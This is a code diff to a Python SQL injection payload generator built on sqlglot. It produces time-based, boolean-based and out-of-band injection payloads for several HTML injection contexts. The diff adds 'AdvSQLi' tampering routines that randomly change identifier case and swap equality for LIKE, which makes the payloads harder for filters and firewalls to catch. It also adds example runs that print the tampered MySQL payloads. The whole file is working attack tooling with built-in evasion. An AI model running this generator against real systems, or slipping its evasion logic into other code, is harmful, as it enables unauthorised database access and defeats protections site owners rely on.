@@ -8,6 +8,32 @@ correct SQL injection payloads by manipulating Abstract Syntax Trees (AST).
 
 import sqlglot
 from sqlglot import exp
+import random
+
+# --- AdvSQLi Transformer Functions ---
+
+def swap_case(s: str) -> str:
+    """Randomly swaps the case of letters in a string."""
+    return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)
+
+def transform_identifier_case(node: exp.Expression) -> exp.Expression:
+    """Transforms the case of identifiers (e.g., function names, columns)."""
+    if isinstance(node, exp.Identifier):
+        node.set('this', swap_case(node.this))
+    return node
+
+def transform_operator_swap(node: exp.Expression) -> exp.Expression:
+    """Swaps logical operators (e.g., EQ to LIKE)."""
+    if isinstance(node, exp.EQ):
+        return exp.Like(this=node.this, expression=node.expression)
+    return node
+
+# The TRANSFORMERS dictionary maps sqlglot expression types to a list of
+# applicable transformation functions. This allows for targeted mutations.
+TRANSFORMERS = {
+    exp.Identifier: [transform_identifier_case],
+    exp.EQ: [transform_operator_swap],
+}
 
 class AstPayloadGenerator:
     """
@@ -19,7 +45,7 @@ class AstPayloadGenerator:
     def __init__(self, dialect: str = "mysql"):
         self.dialect = dialect.lower() if dialect else "mysql"
 
-    def _generate_time_based(self, sleep_time: int, context: str) -> list[tuple[str, str]]:
+    def _generate_time_based(self, sleep_time: int, context: str, tamper: bool = False) -> list[tuple[str, str]]:
         """Generates time-based payloads."""
         payloads = []
 
@@ -44,7 +70,9 @@ class AstPayloadGenerator:
 
         # Variations
         for logic_op in [exp.And, exp.Or]:
-            condition = logic_op(left=exp.Boolean(this=True), right=sleep_func.copy())
+            condition = logic_op(this=exp.Boolean(this=True), expression=sleep_func.copy())
+            if tamper:
+                condition = self._apply_ast_transformations(condition)
             sql = self._build_sql(condition, context)
             payloads.append((sql, f"{self.dialect.upper()}_SLEEP"))
 
@@ -60,17 +88,40 @@ class AstPayloadGenerator:
 
         return payloads
 
-    def _generate_boolean_based(self, context: str) -> list[tuple[str, str, str]]:
-        """Generates boolean-based payloads (true/false pairs)."""
+    def _apply_ast_transformations(self, expression: exp.Expression) -> exp.Expression:
+        """
+        Applies a random selection of transformations to the AST nodes.
+        """
+        # The correct way to walk the tree and replace nodes is to use sqlglot.transform
+        def transform_func(node):
+            node_type = type(node)
+            if node_type in TRANSFORMERS:
+                if random.random() < 0.7:
+                    transformer = random.choice(TRANSFORMERS[node_type])
+                    new_node = transformer(node.copy())
+                    return new_node
+            return node
+
+        return expression.transform(transform_func)
+
+    def _generate_boolean_based(self, context: str, tamper: bool = False) -> list[tuple[str, str, str]]:
+        """Generates boolean-based payloads (true/false pairs) using direct AST construction."""
         pairs = []
         conditions = [
-            (exp.EQ(this="1", to="1"), exp.EQ(this="1", to="2")),
-            (exp.Like(this="'a'", to="'a'"), exp.Like(this="'a'", to="'b'")),
+            (exp.EQ(this=exp.Literal.number(1), to=exp.Literal.number(1)), exp.EQ(this=exp.Literal.number(1), to=exp.Literal.number(2))),
+            (exp.Like(this=exp.Literal.string("a"), to=exp.Literal.string("a")), exp.Like(this=exp.Literal.string("a"), to=exp.Literal.string("b"))),
         ]
+
         for true_cond, false_cond in conditions:
+            if tamper:
+                true_cond = self._apply_ast_transformations(true_cond)
+                false_cond = self._apply_ast_transformations(false_cond)
+
             for logic_op in [exp.And, exp.Or]:
-                true_expr = logic_op(left=exp.Boolean(this=True), right=true_cond.copy())
-                false_expr = logic_op(left=exp.Boolean(this=True), right=false_cond.copy())
+                # Use the correct keyword arguments: `this` for left, `expression` for right
+                true_expr = logic_op(this=exp.Boolean(this=True), expression=true_cond.copy())
+                false_expr = logic_op(this=exp.Boolean(this=True), expression=false_cond.copy())
+
                 true_sql = self._build_sql(true_expr, context)
                 false_sql = self._build_sql(false_expr, context)
                 pairs.append((true_sql, false_sql, f"LOGICAL_{logic_op.__name__.upper()}"))
@@ -119,13 +170,24 @@ class AstPayloadGenerator:
         sql_str = " " + expression.sql(dialect=self.dialect)
         return self._contextualize_string_payload(sql_str, context)
 
-    def generate(self, payload_type: str, context: str, options: dict = None) -> list:
-        """Generates a list of SQLi payloads."""
+    def generate(self, payload_type: str, context: str, options: dict = None, tamper: bool = False) -> list:
+        """
+        Generates a list of SQLi payloads.
+
+        Args:
+            payload_type (str): The type of payload to generate (e.g., "TIME_BASED").
+            context (str): The injection context (e.g., "HTML_ATTRIBUTE_SINGLE_QUOTED").
+            options (dict, optional): A dictionary of options for the payload type.
+            tamper (bool, optional): If True, applies AdvSQLi transformations. Defaults to False.
+
+        Returns:
+            list: A list of generated payloads.
+        """
         options = options or {}
         if payload_type == "TIME_BASED":
-            return self._generate_time_based(options.get("sleep_time", 5), context)
+            return self._generate_time_based(options.get("sleep_time", 5), context, tamper=tamper)
         elif payload_type == "BOOLEAN_BASED":
-            return self._generate_boolean_based(context)
+            return self._generate_boolean_based(context, tamper=tamper)
         elif payload_type == "OOB":
             collaborator_url = options.get("collaborator_url")
             return self._generate_oob(collaborator_url, context) if collaborator_url else []
@@ -133,18 +195,14 @@ class AstPayloadGenerator:
 
 if __name__ == '__main__':
     # Example usage for testing
-    pg_gen = AstPayloadGenerator(dialect='postgres')
     mysql_gen = AstPayloadGenerator(dialect='mysql')
-    mssql_gen = AstPayloadGenerator(dialect='mssql')
 
-    print("--- PostgreSQL Time-Based ---")
-    payloads = pg_gen.generate("TIME_BASED", context="HTML_TEXT", options={"sleep_time": 10})
-    for p, fam in payloads: print(f"  Family: {fam}, Payload: {p}")
-
-    print("\n--- MySQL Boolean-Based (in single quotes) ---")
+    print("--- MySQL Boolean-Based (Standard) ---")
     payloads = mysql_gen.generate("BOOLEAN_BASED", context="HTML_ATTRIBUTE_SINGLE_QUOTED")
-    for t, f, fam in payloads: print(f"  Family: {fam}\n    TRUE: {t}\n    FALSE: {f}")
+    for t, f, fam in payloads[:1]: # Show one example
+        print(f"  Family: {fam}\n    TRUE: {t}\n    FALSE: {f}")
 
-    print("\n--- MSSQL Time-Based (in double quotes) ---")
-    payloads = mssql_gen.generate("TIME_BASED", context="HTML_ATTRIBUTE_DOUBLE_QUOTED", options={"sleep_time": 7})
-    for p, fam in payloads: print(f"  Family: {fam}, Payload: {p}")
+    print("\n--- MySQL Boolean-Based (With AdvSQLi Tampering) ---")
+    tampered_payloads = mysql_gen.generate("BOOLEAN_BASED", context="HTML_ATTRIBUTE_SINGLE_QUOTED", tamper=True)
+    for t, f, fam in tampered_payloads[:1]: # Show one example
+        print(f"  Family: {fam}\n    TRUE: {t}\n    FALSE: {f}")
